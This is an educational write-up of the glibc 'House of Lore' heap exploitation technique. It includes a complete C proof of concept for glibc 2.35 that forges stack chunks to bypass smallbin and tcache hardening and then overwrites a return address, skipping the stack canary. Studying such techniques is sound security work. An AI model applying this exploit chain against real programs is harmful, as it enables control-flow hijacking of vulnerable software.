#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Lore",
    description: "An advanced heap exploitation technique targeting the SmallBin to achieve arbitrary allocation by corrupting the BK pointer.",
    date: "2025-12-26",
    order: 25,
  ),
)<frontmatter>

= glibc Allocator: House of Lore

== Introduction

The "House of Lore" is a classic heap exploitation technique that targets the SmallBin. By corrupting the `bk` (backward) pointer of a chunk in the SmallBin, an attacker can trick the allocator into returning an arbitrary memory address (such as a stack or `.bss` address) as a "chunk" on a subsequent `malloc` call.

While classic versions of this attack were straightforward, modern glibc versions (starting around 2.23/2.26) introduced several hardening measures:
1. *Smallbin double-linked list corruption check*: The allocator now verifies that `victim->bk->fd == victim`.
2. *tcache*: Small-sized allocations are first served from and cached in the tcache, which must be bypassed or exhausted.
3. *Smallbin-to-tcache mechanism*: When a chunk is returned from the SmallBin, other chunks in the same bin are moved to the tcache. This can trigger crashes if the fake `bk` chain is not properly terminated.

== Prerequisites
- *SmallBin Pointer Corruption*: Ability to overwrite the `bk` pointer of a chunk that is currently in a SmallBin.
- *Fake Chunk Control*: Ability to forge multiple fake chunks at the target location (to satisfy `victim->bk->fd == victim` and the `Smallbin-to-tcache` chain).
- *Known Addresses*: Knowledge of both the target memory address and the heap address is usually required.
- *T-cache Exhaustion*: The tcache for the target size must be full to force the allocator to use the SmallBin.

== Example from `house_of_lore.c`

This revisited version bypasses modern hardening checks and has been tested against glibc 2.35.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[4] = {0};
  void* fake_freelist[7][4];

  fprintf(stderr, "\nWelcome to the House of Lore\n");
  fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr, "This is tested against Ubuntu 22.04 - 64bit - glibc-2.35\n\n");

  fprintf(stderr, "Allocating the victim chunk\n");
  intptr_t *victim = malloc(0x100);
  fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);

  fprintf(stderr, "Allocating dummy chunks for using up tcache later\n");
  void *dummies[7];
  for(int i=0; i<7; i++) dummies[i] = malloc(0x100);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr, "Create a fake free-list on the stack\n");
  for(int i=0; i<6; i++) {
    fake_freelist[i][3] = fake_freelist[i+1];
  }
  fake_freelist[6][3] = NULL;
  fprintf(stderr, "fake free-list at %p\n", fake_freelist);

  fprintf(stderr, "Create a fake chunk on the stack\n");
  fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, "Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "
          "introduced by smallbin-to-tcache mechanism\n");
  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

  fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr, "Freeing dummy chunk\n");
  for(int i=0; i<7; i++) free(dummies[i]);
  fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------
  fprintf(stderr, "Now take all dummies chunk in tcache out\n");
  for(int i=0; i<7; i++) malloc(0x100);


  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(0x100);

  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode

  long offset = (long)__builtin_frame_address(0) - (long)p4;
  memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

== Attack Flow Explained

=== 1. Setup and Tcache Bypassing

First, we allocate a `victim` chunk and 7 `dummies` chunks of the same size (`0x110` including header). We then free the `dummies` to fill up the tcache for this size.

When we `free(victim)`, it cannot go into the tcache (it's full) and is too small for the large bin, so it's placed in the *Unsorted Bin*. We then allocate a larger chunk (`p2`) to trigger the sorting mechanism, moving the `victim` chunk from the Unsorted Bin into the *SmallBin*.

=== 2. Forging the Fake Chunk Chain

Modern glibc checks the integrity of the SmallBin list. If we want `malloc` to return our `stack_buffer_1`, the following check must pass when `victim` is deallocated:

```c
if (__glibc_unlikely (bck->fd != victim)) {
    errstr = "malloc(): smallbin double linked list corrupted";
    goto errout;
}
```

Here, `bck` is `victim->bk` (our `stack_buffer_1`). Thus, `stack_buffer_1->fd` must point back to `victim`.

Furthermore, when `stack_buffer_1` itself is about to be returned by a later `malloc`, its own `bk` (`stack_buffer_2`) will be checked: `stack_buffer_2->fd` must point back to `stack_buffer_1`.

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Pointer*], [*Target*], [*Purpose*],
    [`victim->bk`], `stack_buffer_1`, [Point to the stack],
    [`stack_buffer_1->fd`], `victim`, [Bypass first integrity check],
    [`stack_buffer_1->bk`], `stack_buffer_2`, [Bypass second integrity check (Step 1)],
    [`stack_buffer_2->fd`], `stack_buffer_1`, [Bypass second integrity check (Step 2)],
  ),
  caption: [The chain of forged pointers required to bypass glibc hardening.],
)

=== 3. Smallbin-to-Tcache Bypass

In recent glibc versions, when a chunk is served from the SmallBin, the allocator tries to "refill" the tcache with other chunks from the same bin. It follows the `bk` chain and places those chunks into the tcache.

If we don't provide a valid chain, the allocator will follow our fake `bk` into invalid memory and crash. We bypass this by:
1. Creating a `fake_freelist` on the stack.
2. Pointing `stack_buffer_2->bk` to the start of this list.
3. Ensuring the list is properly NULL-terminated.

=== 4. Arbitrary Allocation

After the vulnerability overwrites `victim->bk` with `stack_buffer_1`, we first empty the tcache. Then:
1. `malloc(0x100)`: Returns the original `victim` chunk. The SmallBin's `bk` now points to `stack_buffer_1`.
2. `malloc(0x100)`: Returns `stack_buffer_1`. This is our arbitrary allocation on the stack!

We can now use this stack pointer to overwrite the saved return address (or other sensitive data) and hijack control flow.

